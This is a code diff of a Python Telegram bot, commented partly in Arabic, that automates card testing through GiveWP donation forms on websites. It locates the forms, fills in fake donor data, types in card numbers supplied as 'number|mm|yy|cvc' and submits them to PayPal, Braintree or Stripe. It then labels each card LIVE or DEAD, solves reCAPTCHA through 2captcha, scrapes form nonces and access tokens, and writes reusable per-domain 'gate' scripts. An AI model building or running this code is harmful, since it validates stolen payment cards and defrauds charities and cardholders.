-            "form.give-form", "form[id*='give-form']", "form[class*='give-form']",
-            ".give-form-wrap form", ".give-form form", "[id^='give-form-'] form",
-            "input[name='give-amount']", "input[name='give-form-id']",
-            "input[name='give-form-hash']", "form[id*='give']",
-            ".give-donation-levels-wrap", "button.give-submit", "input.give-submit",
-        ]
-
-        # 1. Main polling 15s
+    async def _find_form(self, page):
+        sels = ["form.give-form","form[id*='give-form']","form[class*='give-form']",
+                ".give-form-wrap form","input[name='give-amount']","input[name='give-form-id']",
+                "input[name='give-form-hash']","form[id*='give']","button.give-submit",
+                "input.give-submit"]
         for attempt in range(15):
-            for sel in give_sels:
+            for sel in sels:
                 try:
-                    if await page.locator(sel).first.count() > 0:
-                        self.log(f"  ✅ main ({sel}) after {attempt}s")
-                        return {"type": "main", "selector": sel}
+                    if await page.locator(sel).first.count() > 0: return "main"
                 except: continue
             if attempt < 14: await asyncio.sleep(1)
-
-        # 2. Iframes
-        for frame in page.frames:
-            if frame == page.main_frame: continue
-            for sel in give_sels:
+        for fr in page.frames:
+            if fr == page.main_frame: continue
+            for sel in sels:
                 try:
-                    if await frame.locator(sel).count() > 0:
-                        self.log(f"  ✅ iframe")
-                        return {"type": "iframe", "frame": frame}
+                    if await fr.locator(sel).count() > 0: return "iframe"
                 except: continue
-
-        # 3. Shadow DOM
         try:
-            shadow = await page.evaluate("""
-                () => {
-                    const res = [];
-                    const search = (root) => {
-                        if (!root) return;
-                        root.querySelectorAll('form, [id*="give"]').forEach(f => {
-                            if (f.querySelector('input[name*="give"], input[name*="amount"]'))
-                                res.push(f.id || 'shadow');
-                        });
-                        root.querySelectorAll('*').forEach(el => { if (el.shadowRoot) search(el.shadowRoot); });
-                    };
-                    search(document);
-                    return res;
-                }
-            """)
-            if shadow:
-                self.log(f"  ✅ shadow ({len(shadow)})")
-                return {"type": "shadow", "count": len(shadow)}
+            shadow = await page.evaluate("""()=>{const r=[];const s=(root)=>{if(!root)return;
+                root.querySelectorAll('form,[id*="give"]').forEach(f=>{if(f.querySelector('input[name*="give"],input[name*="amount"]'))r.push(f.id||'s')});
+                root.querySelectorAll('*').forEach(el=>{if(el.shadowRoot)s(el.shadowRoot)});};s(document);return r;}""")
+            if shadow: return "shadow"
         except: pass
-
-        # 4. Scroll + retry
-        for _ in range(5):
+        for _ in range(3):
             await page.mouse.wheel(0, 500); await asyncio.sleep(1)
-        await asyncio.sleep(2)
-        for sel in give_sels:
+        for sel in sels:
             try:
-                if await page.locator(sel).first.count() > 0:
-                    return {"type": "main-post-scroll", "selector": sel}
+                if await page.locator(sel).first.count() > 0: return "post-scroll"
             except: continue
-
-        # 5. Fallback
         try:
-            forms = await page.locator("form").all()
-            for f in forms:
-                if await f.locator("input").count() >= 2:
-                    return {"type": "fallback-form"}
+            for f in await page.locator("form").all():
+                if await f.locator("input").count() >= 2: return "fallback"
         except: pass
-
         return None
 
     async def _fill(self, page):
@@ -629,42 +381,36 @@ class PW:
         street = random.choice(STREETS); city = random.choice(CITIES)
         state = random.choice(STATES); zp = random.choice(ZIPS)
         phone = f"555{random.randint(1000000,9999999)}"
-
-        hints = {'first': first, 'given': first, 'fname': first, 'last': last,
-                 'family': last, 'surname': last, 'email': email, 'mail': email,
-                 'address': street, 'street': street, 'city': city, 'town': city,
-                 'state': state, 'province': state, 'zip': zp, 'postal': zp,
-                 'postcode': zp, 'phone': phone, 'tel': phone, 'name': f"{first} {last}"}
-
+        hints = {'first':first,'given':first,'fname':first,'last':last,'family':last,
+                 'surname':last,'email':email,'mail':email,'address':street,'street':street,
+                 'city':city,'town':city,'state':state,'province':state,'zip':zp,'postal':zp,
+                 'postcode':zp,'phone':phone,'tel':phone,'name':f"{first} {last}"}
         for fr in page.frames:
             try:
-                # text inputs
                 for inp in await fr.locator("input").all():
                     try:
                         t = await inp.get_attribute("type") or "text"
-                        if t not in ("text", "email", "tel", "url", "number"): continue
+                        if t not in ("text","email","tel","url","number"): continue
                         if not await inp.is_visible(timeout=100): continue
                         if await inp.input_value(): continue
                         key = ((await inp.get_attribute("name") or "") + "|" +
                                (await inp.get_attribute("id") or "") + "|" +
                                (await inp.get_attribute("placeholder") or "")).lower()
-                        for h, v in hints.items():
+                        for h,v in hints.items():
                             if h in key:
                                 await inp.fill(v); break
                         else:
                             if t == "email": await inp.fill(email)
                             elif t == "tel": await inp.fill(phone)
                     except: continue
-
-                # selects
                 for sel in await fr.locator("select").all():
                     try:
                         if not await sel.is_visible(timeout=100): continue
                         cur = await sel.input_value()
-                        if cur and cur not in ("", "0", "-1"): continue
+                        if cur and cur not in ("","0","-1"): continue
                         sn = (await sel.get_attribute("name") or "").lower()
                         if 'country' in sn:
-                            for v in ['US', 'United States', 'USA']:
+                            for v in ['US','United States']:
                                 try: await sel.select_option(v); break
                                 except: continue
                         elif 'state' in sn:
@@ -675,16 +421,15 @@ class PW:
                         else:
                             for o in await sel.locator("option").all():
                                 v = await o.get_attribute("value")
-                                if v and v not in ("", "0", "-1"):
+                                if v and v not in ("","0","-1"):
                                     try: await sel.select_option(v); break
                                     except: continue
                     except: continue
             except: continue
 
-    async def _try_amounts(self, page):
+    async def _amount(self, page):
         for amt in AMOUNTS:
             for fr in page.frames:
-                # data-price
                 try:
                     btn = fr.locator(f"[data-price='{amt}'],[data-price='{amt}.00'],[data-amount='{amt}']").first
                     if await btn.count() > 0:
@@ -693,36 +438,29 @@ class PW:
                         except: await btn.click(force=True, timeout=2000)
                         return amt
                 except: continue
-
-                # text button
                 try:
                     btn = fr.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
                     if await btn.count() > 0:
                         await btn.click(timeout=2000); return amt
                 except: continue
-
-                # radio
                 try:
                     r = fr.locator(f"input[type='radio'][value='{amt}'],[value='{amt}.00']").first
                     if await r.count() > 0:
                         await r.check(force=True); return amt
                 except: continue
-
-                # label
                 try:
                     lbl = fr.locator(f"label:has-text('${amt}')").first
                     if await lbl.count() > 0:
                         await lbl.click(timeout=1500); return amt
                 except: continue
-
-        # fallback input
         for fr in page.frames:
-            for sel in ["input[name='give-amount']", "input[name*='amount'][type='text']",
-                        "input[id*='amount']", "input[name*='custom']"]:
+            for sel in ["input[name='give-amount']","input[name*='amount'][type='text']",
+                        "input[id*='amount']"]:
                 try:
                     inp = fr.locator(sel).first
-                    if await inp.count() > 0 and await inp.is_visible(timeout=300):
-                        await inp.fill("5"); return "5"
+                    if await inp.count() > 0 and await inp.is_visible(timeout=200):
+                        if not (await inp.input_value()) or await inp.input_value() == "0":
+                            await inp.fill("5"); return "5"
                 except: continue
         return None
 
@@ -733,7 +471,7 @@ class PW:
                     try:
                         key = ((await cb.get_attribute("name") or "") + "|" +
                                (await cb.get_attribute("id") or "")).lower()
-                        if any(k in key for k in ['terms', 'agree', 'accept', 'condition', 'privacy', 'consent']):
+                        if any(k in key for k in ['terms','agree','accept','condition','privacy','consent']):
                             if not await cb.is_checked():
                                 try: await cb.check(force=True)
                                 except:
@@ -742,39 +480,30 @@ class PW:
                     except: continue
             except: continue
 
-    async def _donate_multi(self, page):
-        strategies = [
-            "button.give-submit", "input.give-submit",
-            "button[type='submit'][class*='give']",
-            "input[type='submit'][class*='give']",
-            "button[id*='donate' i]", "button[id*='give' i]",
-            "button[name*='donate' i]", "input[name*='donate' i]",
-            "input[type='submit'][value*='Donate' i]",
-            "input[type='submit'][value*='Give' i]",
-            "button:has-text('Donate')", "button:has-text('Give')",
-            "button:has-text('Submit')", "button:has-text('Pay')",
-            "button:has-text('Continue')", "button[type='submit']",
-            "input[type='submit']",
-        ]
-        for i, sel in enumerate(strategies):
-            for fr in page.frames:
+    async def _donate(self, page):
+        sels = ["button.give-submit","input.give-submit","button[type='submit'][class*='give']",
+                "button[id*='donate' i]","button[name*='donate' i]",
+                "input[type='submit'][value*='Donate' i]",
+                "button:has-text('Donate')","button:has-text('Give')",
+                "button:has-text('Submit')","button:has-text('Pay')",
+                "button:has-text('Continue')","button[type='submit']","input[type='submit']"]
+        for fr in page.frames:
+            for sel in sels:
                 try:
                     btn = fr.locator(sel).first
                     if await btn.count() > 0 and await btn.is_visible(timeout=300):
                         await btn.scroll_into_view_if_needed()
-                        await asyncio.sleep(0.3)
                         try: await btn.click(timeout=3000)
                         except: await btn.click(force=True, timeout=3000)
-                        self.log(f"  ✅ clicked #{i}")
                         return True
                 except: continue
         return False
 
-    async def _wait_pp(self, page, timeout=25):
+    async def _wait_pp(self, page, timeout=20):
         for _ in range(timeout*2):
             for fr in page.frames:
                 if fr == page.main_frame: continue
-                if any(k in fr.url.lower() for k in ["paypal", "braintree", "card", "stripe"]):
+                if any(k in fr.url.lower() for k in ["paypal","braintree","card","stripe"]):
                     try:
                         if await fr.locator("input").count() > 0: return fr
                     except: continue
@@ -782,54 +511,44 @@ class PW:
                 if await page.locator("input[autocomplete='cc-number'],input[name*='cardnumber']").first.count() > 0:
                     return page
             except: pass
-            await page.wait_for_timeout(500)
+            await page.wait_for_timeout(400)
         return None
 
-    async def _fill_card(self, frame):
+    async def _card(self, frame):
         try:
             p = self.card.strip().split("|")
-            n, mm, yy, cvc = p[0], p[1], p[2], p[3].strip()
+            n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
             mm = mm.zfill(2)
             if len(yy) == 4: yy = yy[2:]
-            await asyncio.sleep(2)
-
+            await asyncio.sleep(1.5)
             all_fr = [frame]
             try:
                 for f in frame.frames: all_fr.append(f)
             except: pass
-
             async def fill(sels, val):
                 for fr in all_fr:
                     for sel in sels:
                         try:
                             loc = fr.locator(sel).first
                             if await loc.count() > 0:
-                                await loc.click(timeout=1000)
-                                await loc.fill("", timeout=1000)
-                                for ch in str(val): await loc.type(ch, delay=25)
+                                await loc.click(timeout=800)
+                                await loc.fill("", timeout=800)
+                                for ch in str(val): await loc.type(ch, delay=20)
                                 return True
                         except: continue
                 return False
-
-            # email
-            await fill(["input[type='email']", "input[name*='email']"],
+            await fill(["input[type='email']","input[name*='email']"],
                        f"u{int(time.time()*1000)%999999}@gmail.com")
-
-            # card
-            if not await fill(["input#credit-card-number", "input[name='cardnumber']",
-                               "input[name='card-number']", "input[autocomplete='cc-number']",
-                               "input[placeholder*='Card' i]", "input[inputmode='numeric']"], n):
-                return False
-            await asyncio.sleep(0.5)
-
-            # expiry
-            exp = await fill(["input#expiration-date", "input[name='exp']",
+            if not await fill(["input#credit-card-number","input[name='cardnumber']",
+                               "input[autocomplete='cc-number']","input[placeholder*='Card' i]",
+                               "input[inputmode='numeric']"], n): return False
+            await asyncio.sleep(0.4)
+            exp = await fill(["input#expiration-date","input[name='exp']",
                               "input[autocomplete='cc-exp']",
                               "input[placeholder*='MM / YY' i]"], f"{mm}/{yy}")
-
             if not exp:
                 for fr in all_fr:
-                    for sel in ["select[name='expiration-month']", "input[name='expiration-month']"]:
+                    for sel in ["select[name='expiration-month']","input[name='expiration-month']"]:
                         try:
                             loc = fr.locator(sel).first
                             if await loc.count() > 0:
@@ -841,7 +560,7 @@ class PW:
                                 break
                         except: continue
                 for fr in all_fr:
-                    for sel in ["select[name='expiration-year']", "input[name='expiration-year']"]:
+                    for sel in ["select[name='expiration-year']","input[name='expiration-year']"]:
                         try:
                             loc = fr.locator(sel).first
                             if await loc.count() > 0:
@@ -852,22 +571,18 @@ class PW:
                                 else: await loc.fill(yy)
                                 break
                         except: continue
-
-            await asyncio.sleep(0.5)
-
-            # cvc
-            await fill(["input#cvv", "input#cvc", "input[name='cvv']",
-                        "input[name='securityCode']", "input[autocomplete='cc-csc']",
+            await asyncio.sleep(0.4)
+            await fill(["input#cvv","input#cvc","input[name='cvv']",
+                        "input[name='securityCode']","input[autocomplete='cc-csc']",
                         "input[placeholder*='CVV' i]"], cvc)
-
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.4)
             return True
         except: return False
 
     async def _submit(self, frame, page):
         for fr in [frame, page.main_frame] + list(page.frames):
             if not fr: continue
-            for kw in ['Pay', 'Continue', 'Complete', 'Confirm', 'Submit']:
+            for kw in ['Pay','Continue','Complete','Confirm','Submit']:
                 try:
                     btn = fr.locator(f"button:has-text('{kw}')").first
                     if await btn.count() > 0 and await btn.is_visible(timeout=300):
@@ -885,101 +600,221 @@ class PW:
         return False
 
     async def _read(self, page, frame):
-        # 1. PayPal network
         for body in self.debug["paypal"]:
             st, cd = Cls.classify(body)
-            if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": body[:2000], "debug": self.debug}
-            if cd == "PAYPAL_ORDER_MISSING": return {"status": "DEAD", "code": cd, "raw": body[:2000], "debug": self.debug}
-
-        # 2. Stripe network
+            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":body[:2000],"debug":self.debug}
+            if cd == "PAYPAL_ORDER_MISSING": return {"status":"DEAD","code":cd,"raw":body[:2000],"debug":self.debug}
         for body in self.debug["stripe"]:
             st, cd = Cls.classify(body)
-            if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": body[:2000], "debug": self.debug}
-
-        # 3. All network
+            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":body[:2000],"debug":self.debug}
         for net in self.debug["network"]:
-            st, cd = Cls.classify(net.get("body", ""))
-            if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": net["body"][:2000], "debug": self.debug}
-
-        # 4. Page text
+            st, cd = Cls.classify(net.get("body",""))
+            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":net["body"][:2000],"debug":self.debug}
         for fr in [frame, page.main_frame] + list(page.frames):
             if not fr: continue
             try:
                 t = await fr.inner_text("body")
                 if t:
                     st, cd = Cls.classify(t)
-                    if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": t[:2000], "debug": self.debug}
+                    if st == "LIVE": return {"status":"LIVE","code":cd,"raw":t[:2000],"debug":self.debug}
             except: continue
-
-        # 5. Alerts
         try:
             for fr in [frame, page.main_frame]:
                 if not fr: continue
-                for a in await fr.locator("[role='alert'],.give_error,.error,.alert").all():
+                for a in await fr.locator("[role='alert'],.give_error,.error").all():
                     t = await a.inner_text()
                     st, cd = Cls.classify(t)
-                    if st == "LIVE": return {"status": "LIVE", "code": cd, "raw": t[:2000], "debug": self.debug}
+                    if st == "LIVE": return {"status":"LIVE","code":cd,"raw":t[:2000],"debug":self.debug}
         except: pass
-
-        # 6. raw
         if self.debug.get("raw"):
             st, cd = Cls.classify(self.debug["raw"])
-            return {"status": st, "code": cd, "raw": self.debug["raw"][:2000], "debug": self.debug}
-
-        return {"status": "UNKNOWN", "code": "NO_RESPONSE", "raw": "", "debug": self.debug}
+            return {"status":st,"code":cd,"raw":self.debug["raw"][:2000],"debug":self.debug}
+        return {"status":"UNKNOWN","code":"NO_RESPONSE","raw":"","debug":self.debug}
 
     async def _solve_captcha(self, page, html):
-        """يحل CAPTCHA بـ 2captcha (لو API key موجود)"""
         if not TWOCAPTCHA_KEY: return False
         try:
-            # استخرج sitekey
             m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
-            if not m:
-                m = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
+            if not m: m = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
             if not m: return False
             sitekey = m.group(1)
-
-            # أرسل لـ 2captcha
-            import requests as req
-            r = req.post("https://2captcha.com/in.php", data={
-                "key": TWOCAPTCHA_KEY, "method": "userrecaptcha",
-                "googlekey": sitekey, "pageurl": self.url, "json": 1
-            }, timeout=30).json()
-
+            r = requests.post("https://2captcha.com/in.php", data={
+                "key":TWOCAPTCHA_KEY,"method":"userrecaptcha","googlekey":sitekey,
+                "pageurl":self.url,"json":1}, timeout=30).json()
             if r.get("status") != 1: return False
             task_id = r["request"]
-
-            # انتظر الحل
             for _ in range(30):
                 await asyncio.sleep(5)
-                res = req.get(f"https://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=get&id={task_id}&json=1", timeout=30).json()
+                res = requests.get(f"https://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=get&id={task_id}&json=1", timeout=30).json()
                 if res.get("status") == 1:
                     token = res["request"]
-                    # املأ الـ response
-                    await page.evaluate(f"""
-                        () => {{
-                            const el = document.querySelector('[name="g-recaptcha-response"]');
-                            if (el) el.value = "{token}";
-                            if (window.___grecaptcha_cfg) {{
-                                try {{ grecaptcha.getResponse = () => "{token}"; }} catch(e) {{}}
-                            }}
-                        }}
-                    """)
+                    await page.evaluate(f"""()=>{{const el=document.querySelector('[name="g-recaptcha-response"]');if(el)el.value="{token}";}}""")
                     return True
             return False
         except: return False
-        
-        # ═══════════════════════════════════════════════════════════════
-# GATE FILE GENERATOR
-# ═══════════════════════════════════════════════════════════════
-GATE_TEMPLATE = '''"""
-Gate: {domain}
-Form: {form_id}
-Amount: {amount}
-Extracted: {ts}
-Test: {test_card}
-"""
-import requests, re, base64, json, random, uuid
+
+
+class ReqEngine:
+    def __init__(self, url, card):
+        self.url = url; self.card = card
+        self.r = requests.Session(); self.r.verify = False
+        p = urlparse(url)
+        self.host = p.netloc
+        self.path = p.path + ("?" + p.query if p.query else "")
+        self.base = f"https://{self.host}"
+        self.ajax = f"{self.base}/wp-admin/admin-ajax.php"
+        self.form1 = None; self.form2 = None; self.nonce = None
+        self.min_amt = None; self.price_id = "3"
+        self.access_token = None; self.client_token = None
+        self.fields = {}; self.levels = []; self.gateways = []
+        self.captcha = False
+        self.debug = {"attempts":[],"raw":"","extracted":{}}
+
+    def _get(self):
+        try:
+            r = self.r.get(self.url, headers={"user-agent":rua()}, timeout=25, cookies=self.r.cookies)
+            html = r.text or ""
+            self.r.cookies.update(r.cookies)
+            if len(html) < 100: return ""
+            if "give-form-id-prefix" not in html or "give-form-hash" not in html:
+                for pat in [r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
+                            r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
+                            r'<iframe[^>]*src="([^"]*donation[^"]*)"']:
+                    m = re.search(pat, html, re.IGNORECASE)
+                    if m:
+                        iurl = m.group(1)
+                        if iurl.startswith("//"): iurl = "https:" + iurl
+                        elif iurl.startswith("/"): iurl = f"{self.base}{iurl}"
+                        r2 = self.r.get(iurl, headers={"user-agent":rua()}, timeout=25, cookies=self.r.cookies)
+                        self.r.cookies.update(r2.cookies)
+                        html = r2.text or ""
+                        break
+            return html
+        except: return ""
+
+    def _extract(self, html):
+        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
+        if m: self.form1 = m.group(1)
+        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
+        if m: self.form2 = m.group(1)
+        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
+        if m: self.nonce = m.group(1)
+        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
+        if m and m.group(1).strip(): self.min_amt = m.group(1).strip()
+        m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
+        if m: self.price_id = m.group(1)
+        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html):
+            tag = m.group(0)
+            nm = re.search(r'name=["\']([^"\']+)["\']', tag)
+            v = re.search(r'value=["\']([^"\']*)["\']', tag)
+            if nm: self.fields[nm.group(1)] = v.group(1) if v else ""
+        for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', html, re.DOTALL):
+            name = m.group(1)
+            opts = re.findall(r'<option[^>]*value=["\']([^"\']*)["\']', m.group(2))
+            valid = [o for o in opts if o and o not in ("","0","-1")]
+            if valid: self.fields[name] = valid[0]
+        for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', html):
+            tag = m.group(0)
+            nm = re.search(r'name=["\']([^"\']+)["\']', tag)
+            if nm and any(k in nm.group(1).lower() for k in ["terms","agree","accept"]):
+                self.fields[nm.group(1)] = "on"
+        for pat, pg, ag in [(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1, 2),
+                            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2, 1)]:
+            for m in re.finditer(pat, html):
+                try: self.levels.append((m.group(pg), m.group(ag)))
+                except: pass
+        for m in re.finditer(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', html):
+            self.gateways.append(m.group(1))
+        if "g-recaptcha" in html or "hcaptcha" in html: self.captcha = True
+        for pat in [r'"data-client-token"\s*:\s*"([^"]+)"', r'"accessToken"\s*:\s*"([^"]{20,})"']:
+            m = re.search(pat, html)
+            if m:
+                try:
+                    enc = m.group(1)
+                    if "client-token" in pat:
+                        dec = base64.b64decode(enc).decode("utf-8", errors="ignore")
+                        au = re.search(r'"accessToken":"([^"]+)"', dec)
+                        if au: self.access_token = au.group(1)
+                        else: self.client_token = enc
+                    else: self.access_token = enc
+                except: pass
+        self.debug["extracted"] = {"form1":self.form1,"form2":self.form2,
+                                    "nonce":bool(self.nonce),"token":bool(self.access_token),
+                                    "levels":len(self.levels),"gateways":self.gateways}
+        return bool(self.form1 and self.nonce)
+
+    def _build(self, gw, amt, pid, inc=True):
+        base = {"give-honeypot":"","give-form-id-prefix":self.form1 or "",
+                "give-form-id":self.form2 or "","give-form-title":"",
+                "give-current-url":self.url,"give-form-url":self.url,
+                "give-form-minimum":self.min_amt or "","give-form-maximum":"999999.99",
+                "give-form-hash":self.nonce or "","give-price-id":pid,
+                "payment-mode":gw,"give_first":random.choice(FIRST),
+                "give_last":random.choice(LAST),
+                "give_email":f"u{random.randint(1000,99999)}@gmail.com",
+                "card_name":"Test Bot","give-gateway":gw}
+        if inc: base["give-amount"] = amt
+        for k, v in self.fields.items():
+            if k not in base: base[k] = v
+        if self.captcha: base["g-recaptcha-response"] = ""
+        return MultipartEncoder({k:(None,v) for k,v in base.items()})
+
+    def charge(self, cc):
+        html = self._get()
+        if not html: return {"status":"DEAD","code":"GET_FAILED","debug":self.debug}
+        if not self._extract(html): return {"status":"DEAD","code":"FORM_NOT_FOUND","debug":self.debug}
+        attempts = []
+        for pid, amt in self.levels: attempts.append((pid, amt, True))
+        if self.min_amt: attempts.append(("custom", self.min_amt, True))
+        for a in AMOUNTS[:6]: attempts.append(("custom", a, True))
+        attempts.append(("custom", "", True))
+        gateways = self.gateways or GATEWAYS
+        for gw in gateways:
+            for pid, amt, inc in attempts:
+                data = self._build(gw, amt, pid, inc)
+                headers = {"content-type":data.content_type,"origin":self.base,
+                           "referer":self.url,"user-agent":rua(),
+                           "x-requested-with":"XMLHttpRequest"}
+                try:
+                    r = self.r.post(self.ajax, params={"action":"give_process_donation"},
+                                    headers=headers, data=data, cookies=self.r.cookies, timeout=25)
+                    self.debug["attempts"].append({"gw":gw,"amt":amt,"pid":pid,
+                                                    "status":r.status_code,"body":r.text[:1500]})
+                    st, cd = Cls.classify(r.text)
+                    if st == "LIVE":
+                        return {"status":"LIVE","code":cd,"raw":r.text[:2000],"debug":self.debug}
+                except: continue
+        if self.debug["attempts"]:
+            self.debug["raw"] = self.debug["attempts"][-1]["body"]
+        return {"status":"DEAD","code":"ALL_FAILED","raw":"","debug":self.debug}
+
+
+def check(url, card):
+    if HAS_PW:
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            try:
+                eng = PW(url, card)
+                r = loop.run_until_complete(eng.run())
+                if r["status"] in ("LIVE","UNKNOWN"): return r
+                if r["status"] == "DEAD" and r["code"] not in (
+                    "CLOUDFLARE","CAPTCHA","GATEWAY_DISABLED","FORM_NOT_PUBLISHED"):
+                    req = ReqEngine(url, card)
+                    r2 = req.charge(card)
+                    if r2["status"] == "LIVE": return r2
+                    return r
+                return r
+            finally: loop.close()
+        except Exception as e:
+            try: return ReqEngine(url, card).charge(card)
+            except: return {"status":"DEAD","code":"ALL_FAILED","debug":{}}
+    else:
+        return ReqEngine(url, card).charge(card)
+
+
+GATE_TPL = '''"""Gate: {domain} | Form: {form_id} | Amount: {amount}"""
+import requests, re, base64, json, random
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 
 META = "{meta}"
@@ -1005,7 +840,7 @@ class PayPal:
 
     def _tok(self):
         try:
-            r = self.r.get(self.url, headers={{"user-agent": UA}}, timeout=20, cookies=self.r.cookies)
+            r = self.r.get(self.url, headers={{"user-agent":UA}}, timeout=20, cookies=self.r.cookies)
             self.r.cookies.update(r.cookies)
             m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', r.text)
             if m:
@@ -1019,28 +854,22 @@ class PayPal:
 
     def _data(self):
         return MultipartEncoder({{
-            "give-honeypot": (None,""),
-            "give-form-id-prefix": (None, self.form1),
-            "give-form-id": (None, self.form2),
-            "give-form-title": (None,""),
-            "give-current-url": (None, self.url),
-            "give-form-url": (None, self.url),
-            "give-form-minimum": (None,"5.00"),
-            "give-form-maximum": (None,"999999.99"),
-            "give-form-hash": (None, self.nonce),
-            "give-price-id": (None, self.pid),
-            "give-amount": (None, self.amt),
-            "payment-mode": (None,"paypal-commerce"),
-            "give-gateway": (None,"paypal-commerce"),
-            "give_first": (None, random.choice(["James","John"])),
-            "give_last": (None, random.choice(["Smith","Johnson"])),
-            "give_email": (None, f"u{{random.randint(1000,99999)}}@gmail.com"),
-            "card_name": (None,"Test"),
+            "give-honeypot":(None,""),"give-form-id-prefix":(None,self.form1),
+            "give-form-id":(None,self.form2),"give-form-title":(None,""),
+            "give-current-url":(None,self.url),"give-form-url":(None,self.url),
+            "give-form-minimum":(None,"5.00"),"give-form-maximum":(None,"999999.99"),
+            "give-form-hash":(None,self.nonce),"give-price-id":(None,self.pid),
+            "give-amount":(None,self.amt),"payment-mode":(None,"paypal-commerce"),
+            "give-gateway":(None,"paypal-commerce"),
+            "give_first":(None,random.choice(["James","John"])),
+            "give_last":(None,random.choice(["Smith","Johnson"])),
+            "give_email":(None,f"u{{random.randint(1000,99999)}}@gmail.com"),
+            "card_name":(None,"Test"),
         }})
 
     def _create(self):
         d = self._data()
-        h = {{"content-type": d.content_type,"origin": self.base,"referer": self.url,"user-agent": UA}}
+        h = {{"content-type":d.content_type,"origin":self.base,"referer":self.url,"user-agent":UA}}
         try:
             r = self.r.post(self.ajax, params={{"action":"give_paypal_commerce_create_order"}},
                            headers=h, data=d, cookies=self.r.cookies, timeout=20)
@@ -1054,15 +883,11 @@ class PayPal:
         n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
         if "20" in yy: yy = yy.split("20")[1]
         if len(yy) == 4: yy = yy[2:]
-        h = {{
-            "authority":"cors.api.paypal.com","accept":"*/*",
-            "authorization":f"Bearer {{self.au}}",
-            "braintree-sdk-version":SDK,"content-type":"application/json",
-            "origin":"https://assets.braintreegateway.com",
-            "paypal-client-metadata-id":META,
-            "referer":"https://assets.braintreegateway.com/",
-            "user-agent":UA,
-        }}
+        h = {{"authority":"cors.api.paypal.com","accept":"*/*",
+              "authorization":f"Bearer {{self.au}}","braintree-sdk-version":SDK,
+              "content-type":"application/json","origin":"https://assets.braintreegateway.com",
+              "paypal-client-metadata-id":META,"referer":"https://assets.braintreegateway.com/",
+              "user-agent":UA}}
         j = {{"payment_source":{{"card":{{"number":n,"expiry":f"20{{yy}}-{{mm}}",
               "security_code":cvc,"attributes":{{"verification":{{"method":"SCA_WHEN_REQUIRED"}}}}}}}},
               "application_context":{{"vault":False}}}}
@@ -1103,30 +928,25 @@ if __name__ == "__main__":
     r = p.charge("{test_card}")
     print(f"Status: {{r['status']}}")
     print(f"Code: {{r['code']}}")
-    print(f"Raw: {{r['raw'][:300]}}")
 '''
 
 
 def gen_gate(url, dbg, card):
     info = dbg.get("extracted", {})
     p = urlparse(url)
-    return GATE_TEMPLATE.format(
-        domain=p.netloc, form_id=info.get("form_id", "?"),
-        amount=dbg.get("amount", "5.00"), ts=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        test_card=card, meta=PAYPAL_META, sdk=BRAINTREE_SDK,
-        url=url, host=p.netloc, path=p.path + ("?" + p.query if p.query else ""),
-        form1=info.get("form1", ""), form2=info.get("form2", ""),
-        nonce=info.get("nonce", ""), pid=info.get("price_id", "3"),
-    )
+    return GATE_TPL.format(domain=p.netloc, form_id=info.get("form_id","?"),
+                            amount=dbg.get("amount","5.00"), meta=PAYPAL_META,
+                            sdk=BRAINTREE_SDK, url=url, host=p.netloc,
+                            path=p.path + ("?" + p.query if p.query else ""),
+                            form1=info.get("form1",""), form2=info.get("form2",""),
+                            nonce=info.get("nonce",""), pid=info.get("price_id","3"),
+                            test_card=card)
 
 
-# ═══════════════════════════════════════════════════════════════
-# BOT HANDLERS
-# ═══════════════════════════════════════════════════════════════
 @bot.message_handler(commands=["start"])
 def start_cmd(msg):
     if is_blocked(msg.from_user.id):
-        safe_send(msg.chat.id, "🚫 You are blocked."); return
+        safe_send(msg.chat.id, "🚫 Blocked."); return
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
     kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
@@ -1136,13 +956,12 @@ def start_cmd(msg):
 <b>ID:</b> <code>{msg.from_user.id}</code>
 
 ━━━━━━━━━━━━━━━━━━━━
-[⚡] /paypal <code>&lt;url&gt;</code>
-[⚡] /mass — ملف روابط
-[⚡] /test — فحص سريع
-[⚡] /stop — إيقاف
+/paypal <code>&lt;url&gt;</code>
+/mass — ملف روابط
+/test — فحص سريع
+/stop — إيقاف
 ━━━━━━━━━━━━━━━━━━━━
-🔥 Legendary Edition
-📄 Auto Gate Files"""
+🔥 Legendary 🔥"""
     safe_send(msg.chat.id, text, kb)
 
 
@@ -1150,27 +969,15 @@ def start_cmd(msg):
 def cb_help(call):
     try: bot.answer_callback_query(call.id)
     except: pass
-    text = """<b>📖 المساعدة</b>
